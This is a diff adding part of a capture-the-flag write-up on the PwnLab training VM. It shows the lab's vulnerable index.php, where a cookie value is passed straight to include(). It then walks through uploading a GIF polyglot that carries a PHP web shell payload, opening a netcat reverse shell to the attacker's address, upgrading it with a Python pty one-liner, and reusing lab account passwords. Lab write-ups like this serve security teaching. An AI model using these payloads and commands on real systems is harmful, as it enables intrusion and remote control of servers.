@@ -150,3 +150,63 @@ if(isset($_POST['submit'])) {
 
 ?>
 ```
+
+I played around with this for a bit. My thinking was: I need to get a `.php` file up there. Either so I can include it via ?page=, or so I could just browse to it (since `/upload/` was available). However, try as I might, there was no way in the code above I could see to get a file up with the extension `.php`.
+
+Why .php? Because the ?page include affixes a .php to the end. I tried null byte escaping, but it didn't work. Also, an image by itself (which had to be a valid image) with PHP inserted into it won't be run as PHP unless its `include`d, or is processed by PHP due to its mimetype (which, as far as I am aware, would require the php extension).
+
+Ultimately, I needed to get another hint, and this one caused a bit of a face palm: going back to index.php, the full content is: 
+
+```php
+<?php
+//Multilingual. Not implemented yet.
+//setcookie("lang","en.lang.php");
+if (isset($_COOKIE['lang']))
+{
+        include("lang/".$_COOKIE['lang']);
+}
+// Not implemented yet.
+?>
+<html>
+<head>
+<title>PwnLab Intranet Image Hosting</title>
+</head>
+<body>
+<center>
+<img src="images/pwnlab.png"><br />
+[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
+<hr/><br/>
+<?php
+        if (isset($_GET['page']))
+        {
+                include($_GET['page'].".php");
+        }
+        else
+        {
+                echo "Use this server to upload and share image files inside the intranet";
+        }
+?>
+</center>
+</body>
+</html>
+```
+
+I missed it! The include cookie lang statement at the top! No .php affixed there. /facepalm
+
+## Image Polyglot and reverse shell
+
+By setting the cookie to be `lang=../upload/<image name>.gif` or similar I could successfully include my uploaded file content onto the page. I tried just creating a jpeg and `>>` a shell onto the end, but this wasn't getting processed properly.
+
+Ultimately I used [https://github.com/chinarulezzz/pixload](https://github.com/chinarulezzz/pixload), a nice simple tool that can create polyglot images in a variety of formats with whatever payload you want. I ran it as: `./gif.pl -payload '<?php system($_GET["cmd"]); ?>' -o shell.gif` to create an image which sailed passed the upload filter, and then when I included it via the cookie I got that magic `whoami` print `www-data` to the screen.
+
+Using a nc reverse shell (`/?cmd=nc 192.168.1.4 4444 -e /bin/bash`) I had a command line as www-data, which I upgraded with the classic `python -c 'import pty; pty.spawn("/bin/bash")'`
+
+## Enumeration
+
+There seemed to be four accounts of note on the system: `mike`, `kent`, `kane` and `john`.
+
+Going back to the mysql out from before, I tested their passwords. It worked for kent (`JWzXuBJJNy`) and kane (still `iSv5Ym2GRo`), but not mike.
+
+The machine didn't seem to run sudo, just su, so I couldn't do a `sudo -l` as I normally would.
+
+kane had a file called ./msgmike in his home directory, that ran as mike. Running it resulted in the following error: `cat: /home/mike/msg.txt: No such file or directory`
